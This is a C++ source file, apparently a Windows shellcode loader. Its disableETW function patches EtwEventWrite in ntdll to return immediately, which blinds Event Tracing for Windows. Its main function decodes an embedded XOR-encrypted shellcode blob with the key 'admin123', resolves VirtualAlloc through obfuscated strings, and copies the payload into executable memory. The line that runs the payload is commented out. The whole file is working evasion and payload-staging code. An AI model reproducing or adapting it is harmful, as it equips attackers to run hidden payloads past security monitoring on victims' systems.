// shellcode_execute.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h>

typedef void* (*tNtVirtual) (HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T  NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
tNtVirtual oNtVirtual;


void disableETW(void) {
	// return 0
	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };     // xor rax, rax; ret

	ULONG oldprotect = 0;
	size_t size = sizeof(patch);

	HANDLE hCurrentProc = GetCurrentProcess();

	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };




	void* pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)sEtwEventWrite);
	if ((DWORD)GetModuleHandle("ntdll.dll") == NULL) { std::cout << "error"; }
	else {
		printf("NTDLL.DLL START ADDRESS: %08x", (DWORD)GetModuleHandle("ntdll.dll"));
	}
	if ((DWORD)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtProtectVirtualMemory") == NULL) { std::cout << "error"; }
	else { printf("\nNtProtectVirtualMemory ADDRESS: %08x", (DWORD)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtProtectVirtualMemory")); }

	FARPROC farProc = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtProtectVirtualMemory");


	oNtVirtual = (tNtVirtual)farProc;
	oNtVirtual(hCurrentProc, &pEventWrite, (PSIZE_T)&size, PAGE_READWRITE, &oldprotect);

	//memcpy(pEventWrite, patch, size / sizeof(patch[0]));
	memcpy(pEventWrite, patch, 4);
	oNtVirtual(hCurrentProc, &pEventWrite, (PSIZE_T)&size, oldprotect, &oldprotect);
	FlushInstructionCache(hCurrentProc, pEventWrite, size);

}

int main()
{

	disableETW();
	// Encrypted shellcode and cipher key obtained from shellcode_encoder.py
	char encryptedShellcode[] = "\x9d\x2c\xee\x8d\x9e\xd9\xfa\x33\x61\x64\x2c\x38\x2f\x61\x60\x62\x37\x2c\x5c\xbb\x0b\x79\xb9\x61\x01\x2c\xe6\x3b\x76\x79\xb9\x61\x41\x2c\xe6\x1b\x3e\x79\x3d\x84\x2b\x2e\x20\x58\xa7\x79\x03\xf3\xcd\x58\x0c\x15\x6c\x1d\x12\x72\xa0\xad\x60\x28\x6f\xf0\xd0\xde\x33\x25\x3c\x21\xe5\x63\x12\xb8\x23\x58\x25\x68\xbe\x57\xb3\x4b\x79\x6f\x6f\x1c\x1c\xba\xb2\xbb\x61\x64\x6d\x21\xeb\xf1\x46\x54\x29\x65\xbd\x39\xe5\x79\x2a\x77\xea\x24\x4d\x20\x6f\xe1\xd1\x65\x29\x9b\xa4\x28\xe5\x05\xba\x7b\x60\xb2\x20\x58\xa7\x79\x03\xf3\xcd\x25\xac\xa0\x63\x70\x33\xf2\x59\x84\x18\x98\x22\x32\x7e\x17\x69\x21\x54\xb8\x1b\xe9\x6a\x77\xea\x24\x49\x20\x6f\xe1\x54\x72\xea\x68\x25\x2d\xe5\x71\x2e\x7a\x60\xb4\x2c\xe2\x6a\xb9\x7a\x32\xb1\x25\x35\x28\x36\x6f\x6b\x69\x20\x3c\x2c\x30\x2f\x6b\x7a\xb0\x8d\x44\x2c\x3b\x91\xd1\x6a\x72\x38\x3e\x25\xe2\x7c\xd8\x7d\xcc\x9e\x9b\x30\x03\x6e\x78\x8c\x44\x08\x0a\x04\x07\x0b\x45\x32\x72\x37\x2d\xe4\x8f\x22\xb8\xc3\x72\xdb\x28\x1a\x4f\x69\xce\xe7\x7b\x50\xad\x25\x58\xbc\x7c\x03\xf3\x2c\x55\xa4\x28\x3e\x70\x62\x72\xdb\x5e\x3b\x10\xc9\xce\xe7\xd8\x12\x3e\x25\xe0\xaf\x70\x8a\x63\x61\x64\x6d\x24\x5f\xf8\x73\x62\x20\x35\x07\x6a\x2f\x60\x73\x89\x36\xed\xf2\xaf\x91\xe4\xd9\x6a\x3a\x2c\xe4\xa8\x26\x00\xe0\x7a\xe8\xbc\x20\x58\xa7\x63\x5a\x33\x63\x24\xe9\x3b\x3c\x70\x88\xd8\x34\x4a\x56\x96\xbb\x79\xbb\xf5\x29\xe7\xae\x39\x04\x3b\x6d\x7b\xe8\x95\x25\xe0\xb4\x78\xf5\xf3\x9e\x9b\x92\x96\x23\x00\xfb\x61\x33\x25\xd7\x44\x68\x29\x49\xcc\xb4\xe1\xad\x66\xeb\xac\x33\x33\x61\x2c\x92\xa6\x61\xb5\xbe\x32\x61\x64\x86\xba\x87\xd5\x33\x33\x61\x8c\xcf\x96\x91\xce\x1d\x7b\x08\x33\x38\x69\x4d\x8f\xa4\xd5\x7b\x55\x01\x8a\x85\x56\x9c\xb4\x92\x22\x6b\xd6\x06\x79\xb1\x2e\x11\x1b\x45\x36\x97\x6f\x2d\xf9\x27\x1a\xde\x58\x82\x9c\x28\xfb\x0a\x5a\x47\x5e\x3a\x95\x9e\x45\x87\xce\x2e\x71\x66\x11\x44\xa4\xa2\xc6\xb4\xda\xb0\xf0\x79\x01\xa1\x4b\xa2\xa2\x6c\x08\x4d\x5a\x0f\x2c\x9c\x35\x49\x31\x67\x40\x04\x16\x40\x28\x09\x54\x5c\x47\x5b\x44\x20\x06\x14\x58\x5e\x5f\x00\x4b\x59\x47\x5e\x11\x1a\x50\x0e\x09\x1d\x08\x1a\x58\x50\x5f\x04\x5f\x4d\x24\x3d\x78\x77\x13\x59\x4a\x5d\x52\x4e\x66\x5b\x5d\x05\x0b\x1a\x1a\x4e\x7f\x66\x13\x54\x4a\x5c\x52\x4e\x65\x40\x5a\x05\x01\x03\x1d\x41\x05\x1c\x03\x5a\x44\x24\x07\x08\x5e\x62\x52\x15\x0c\x43\x58\x47\x3c\x38\x33\x1b\xe3\x8f\x91\x34\x7d\x94\xe7\x55\x9e\x46\x53\x60\x6e\x3f\x4a\xe7\x37\x40\x69\xe3\x86\xdc\xd4\x60\x11\xb2\x3e\xa5\xe0\xd7\x59\xf3\xef\x66\xec\xf6\x89\x3f\x2e\x04\x9a\x4d\x63\x28\x8f\x0c\xf5\x04\xf9\x39\x69\xee\x77\xfe\xaa\xcd\x85\x7d\x3a\xbc\x22\x48\x4e\x14\x29\x7c\x69\x7c\xa1\xb0\xe2\xa7\xc3\xa1\xfd\x39\x08\x58\x09\xd5\x19\x74\x6e\x29\xc5\xb6\x8d\x3a\x27\x52\xd4\xe4\x0b\x17\xbf\x2c\x23\xea\x0b\x2b\xd1\x28\xef\x7b\xda\x5b\x15\x29\xd6\x48\x76\x9d\x43\x7b\x41\x0e\x14\xe6\x30\xef\x6e\xbf\x3f\x9b\xf2\xbe\xd6\xbb\x5f\x67\xf9\x8e\xd0\x3d\x9a\x84\x55\xe9\xd6\x29\x08\xf9\xae\xf3\x52\x19\xfa\xf4\xf7\x5a\xcf\x79\x9d\x0a\xb1\x96\x94\xf7\xed\x72\x5b\xd8\x2b\x8c\x23\x93\x35\xcc\x3e\xe1\xc2\x4d\xd7\x05\x7b\x95\xeb\x2b\x93\xdb\xf6\xc0\xbe\x37\x64\xdd\x2a\x7a\xf7\xa0\x70\x3e\xb2\x1d\x5b\xa5\x78\x3e\x78\xa0\x50\xc1\xa1\xb2\x03\x9a\x8b\x8a\x91\xa9\x29\xae\x31\x73\x8d\x91\xd1\xcf\x3f\x91\xe4\x7a\x02\xa8\xde\x6d\x69\x2e\x31\x73\x8b\x61\x74\x6d\x69\x2f\x88\x72\x33\x61\x64\x2c\xd3\x36\x95\x61\xd6\x9e\xb1\x25\xfa\x3d\x62\x7a\xba\x86\x2c\xe4\x98\x26\xb8\xe8\x72\xd9\x64\x4d\x69\x6e\x78\xbb\xca\x20\xde\x7f\xff\xe7\xd3\xcd\xe6\x29\xe7\xa9\x49\xeb\xf1\x46\x85\x07\xef\x6a\x21\x6f\xf2\xb7\xf3\x14\xb3\x35\x31\x36\x79\x37\x33\x61\x64\x6d\x39\xad\xd9\xad\xce\x9e\x9b\x5c\x50\x5c\x1f\x03\x05\x59\x4a\x5d\x47\x5f\x02\x03\x33\x30\x6d\xd2\x04";
	char key[] = "admin123";
	char cipherType[] = "xor";


	// Char array to host the deciphered shellcode
	char shellcode[sizeof encryptedShellcode];


	// XOR decoding stub using the key defined above must be the same as the encoding key
	int j = 0;
	for (int i = 0; i < sizeof encryptedShellcode; i++) {
		if (j == sizeof key - 1) j = 0;

		shellcode[i] = encryptedShellcode[i] ^ key[j];
		j++;
	}

	typedef VOID *(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T  dwSize, DWORD  flAllocationType, DWORD flProtect);

	pVirtualAlloc fnVirtualProtect;

	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0x0 };
	unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

	fnVirtualProtect = (pVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);
	// call VirtualProtect
	void* exec = fnVirtualProtect(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


	memcpy(exec, shellcode, sizeof shellcode);

	// Call the shellcode
	//((void(*)())exec)();

}
